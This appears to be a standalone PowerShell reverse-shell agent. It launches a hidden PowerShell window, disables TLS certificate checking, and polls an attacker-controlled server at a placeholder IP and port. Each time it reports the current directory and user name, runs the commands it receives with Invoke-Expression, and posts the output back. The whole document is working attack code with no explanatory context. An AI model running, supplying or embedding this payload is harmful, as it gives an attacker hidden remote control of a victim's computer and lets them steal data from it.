Start-Process $PSHOME\powershell.exe -ArgumentList {add-type @'
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
'@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;
$p='https://';$l='*IP_ADDRESS*:*PORT*';$i=(Invoke-WebRequest -UseBasicParsing -Uri "${p}${l}/").Content;while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri "${p}${l}/${i}" -Headers @{'x-Dir'=($pwd.Path); 'x-User'=(whoami)}).Content;if ($c -ne ''){$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$r=Invoke-WebRequest -UseBasicParsing -Uri "${p}${l}/${i}" -Headers @{'x-Dir'=($pwd.Path); 'x-User'=(whoami)} -Method Post -Body ($e+$r)}sleep 0.8}} -WindowStyle Hidden